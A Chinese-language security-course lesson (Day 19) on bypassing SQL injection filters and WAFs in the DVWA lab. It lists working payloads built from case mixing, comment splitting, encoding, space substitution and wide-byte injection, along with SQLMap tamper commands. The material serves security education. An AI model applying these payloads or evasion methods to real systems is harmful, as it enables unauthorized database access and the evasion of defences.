---
title: Day019：SQL 注入 - 绕过技巧
tags:
  - 网络安全
  - SQL注入
  - WAF绕过
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d019
date: 2026-02-10
updated: 2026-01-28
---

# Day019：SQL 注入 - 绕过技巧

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 筑基（第一阶段） |
| **所属周次** | Week 3：SQL 注入入门 |
| **今日主题** | 绕过过滤和 WAF |
| **预计时间** | 2 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你发现一个注入点，但输入 `UNION` 被拦截了，输入 `SELECT` 也被拦截了。
>
> **问题**：关键字被过滤了，怎么绑过？
>
> **今天的任务**：学会常见的绑过技巧，突破过滤限制。

---

## 今日目标

- [ ] 了解常见的过滤方式
- [ ] 掌握大小写、注释等绑过技巧
- [ ] 学会使用编码绑过
- [ ] 了解 SQLMap 的 tamper 脚本

**闯关条件**：在 DVWA Medium 级别成功注入。

---

## 实战任务（先动手！）

### 任务 1：体验过滤（15 分钟）

在 DVWA 中把安全级别设为 **Medium**。

尝试之前的 payload：
```
1' OR '1'='1
```

**发现问题**：单引号被转义了！

查看源码（DVWA 提供了查看源码功能）：
```php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
```

单引号被转义成了 `\'`。

---

### 任务 2：数字型注入绕过（15 分钟）

Medium 级别使用了下拉菜单，看起来只能选 1-5。

**用 Burp Suite 拦截请求**：
1. 打开 Burp Suite，设置代理
2. 在 DVWA 选择一个 ID，点击 Submit
3. 在 Burp 中拦截到请求
4. 修改 `id=1` 为 `id=1 OR 1=1`
5. Forward 请求

**发现**：虽然前端限制，但后端没有严格验证！

---

### 任务 3：大小写绕过（10 分钟）

如果过滤了 `UNION`，试试大小写混用：

```sql
1 uNiOn SeLeCt 1,2 --
1 UnIoN sElEcT 1,2 --
```

**原理**：很多过滤只匹配全大写或全小写，SQL 本身不区分大小写。

---

### 任务 4：注释绕过（15 分钟）

用注释符打断关键字：

```sql
-- 原始
UNION SELECT

-- 绕过方式
UN/**/ION SEL/**/ECT
UNI/**/ON/**/SEL/**/ECT
```

**内联注释**（MySQL 特有）：
```sql
/*!UNION*/ /*!SELECT*/ 1,2
```

---

### 任务 5：编码绕过（15 分钟）

**URL 编码**：
```
' → %27
空格 → %20 或 +
= → %3D
```

**双重 URL 编码**（绕过解码一次的 WAF）：
```
' → %2527
```

**十六进制编码**（MySQL）：
```sql
-- 原始
SELECT * FROM users WHERE name='admin'

-- 十六进制
SELECT * FROM users WHERE name=0x61646D696E
```

`admin` 的十六进制是 `0x61646D696E`。

---

### 任务 6：空格绕过（15 分钟）

如果空格被过滤：

| 替代方式 | 示例 |
|----------|------|
| 注释 `/**/` | `UNION/**/SELECT` |
| Tab `%09` | `UNION%09SELECT` |
| 换行 `%0a` | `UNION%0aSELECT` |
| 括号 | `UNION(SELECT(1),(2))` |

---

### 任务 7：使用 SQLMap Tamper（15 分钟）

SQLMap 内置了很多绕过脚本：

```bash
# 查看所有 tamper 脚本
sqlmap --list-tampers

# 使用单个 tamper
sqlmap -u "URL" --tamper=space2comment

# 使用多个 tamper
sqlmap -u "URL" --tamper=space2comment,randomcase
```

**常用 tamper**：
- `space2comment`：空格转注释
- `randomcase`：随机大小写
- `between`：用 BETWEEN 替换 >
- `charencode`：URL 编码

---

## 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| 理解 Medium 级别的过滤机制 | |
| 成功用 Burp 修改请求绕过前端限制 | |
| 知道 3 种以上绕过技巧 | |
| 会使用 SQLMap tamper 脚本 | |

---

## 底层补课

### 常见过滤方式

| 过滤类型 | 说明 | 绕过思路 |
|----------|------|----------|
| 关键字过滤 | 拦截 UNION、SELECT 等 | 大小写、注释、编码 |
| 特殊字符过滤 | 拦截 `'`、`"`、`--` | 编码、宽字节 |
| 空格过滤 | 拦截空格 | 注释、Tab、换行 |
| 函数过滤 | 拦截 SLEEP、CONCAT 等 | 替代函数、编码 |

### 编码速查

| 字符 | URL 编码 | 双重编码 | 十六进制 |
|------|----------|----------|----------|
| 空格 | %20 | %2520 | - |
| ' | %27 | %2527 | - |
| = | %3D | %253D | - |
| admin | - | - | 0x61646D696E |

### 等价函数替换

| 原函数 | 替代函数 |
|--------|----------|
| `CONCAT(a,b)` | `CONCAT_WS('',a,b)` |
| `SUBSTRING(s,1,1)` | `MID(s,1,1)` 或 `LEFT(s,1)` |
| `ASCII(c)` | `ORD(c)` |
| `SLEEP(5)` | `BENCHMARK(5000000,SHA1('test'))` |

### 逻辑等价替换

| 原表达式 | 等价表达式 |
|----------|------------|
| `OR 1=1` | `OR 2>1` 或 `OR 'a'='a'` |
| `AND 1=1` | `AND 2>1` 或 `&&1` |
| `=` | `LIKE` 或 `REGEXP` |

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 不知道过滤了什么 | payload 失败但不知道原因 | 逐个字符测试，定位过滤点 |
| 绕过后仍失败 | 以为绕过了但没成功 | 可能多层过滤，需要组合技 |
| Tamper 太多 | 请求变形太大导致失败 | 精准选择需要的 tamper |

---

## 知识卡片速查

### 绕过技巧速查

```sql
-- 大小写混用
uNiOn SeLeCt

-- 注释打断
UN/**/ION SEL/**/ECT

-- 内联注释（MySQL）
/*!UNION*/ /*!SELECT*/

-- 空格替代
UNION%09SELECT
UNION%0aSELECT
UNION/**/SELECT

-- 十六进制
WHERE name=0x61646D696E  (admin)

-- 双写绕过（针对删除一次的过滤）
UNUNIONION SELSELECTECT
```

### SQLMap Tamper 速查

```bash
# 空格处理
--tamper=space2comment
--tamper=space2plus
--tamper=space2randomblank

# 大小写
--tamper=randomcase

# 编码
--tamper=charencode
--tamper=chardoubleencode

# 综合
--tamper=between,randomcase,space2comment
```

---

## 常见问题

**Q1：怎么知道目标过滤了什么？**

A1：
1. 输入单个特殊字符测试：`'`、`"`、`--`、空格
2. 输入关键字测试：`UNION`、`SELECT`、`OR`
3. 对比正常请求和异常请求的响应
4. 有些 WAF 会返回特定错误页面

**Q2：宽字节注入是什么？**

A2：当数据库使用 GBK 编码，而 PHP 使用 `addslashes()` 转义时：
- 输入 `%df'`
- `addslashes` 把 `'` 变成 `\'`，即 `%df%5c%27`
- GBK 把 `%df%5c` 解码为一个汉字，`'` 逃脱出来

**Q3：真实环境的 WAF 好绕吗？**

A3：商业 WAF（如 Cloudflare、阿里云 WAF）很难绕过，需要结合多种技巧，而且可能仍然失败。但很多自研 WAF 或配置不当的 WAF 是可以绕过的。

---

## 明日预告

**Day 020：SQL 注入 - 综合实验室**

明天你将：
- 在不同难度的靶场实战
- 综合运用本周所学技术
- 挑战更真实的场景

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你学会了绑过技巧——对抗过滤和 WAF。
>
> 这是攻防对抗的核心：他们过滤，你绕过；你绕过，他们加规则。
>
> 没有万能的绕过方法，关键是**理解过滤原理**，然后针对性突破。
>
> 真实渗透中，绕过 WAF 可能要花几天时间，甚至绕不过去。
>
> 记住：**绕过不是目的，理解防御才能更好地攻击**。

```bash
echo "Day 019 Complete! 绕过技巧 GET！"
```
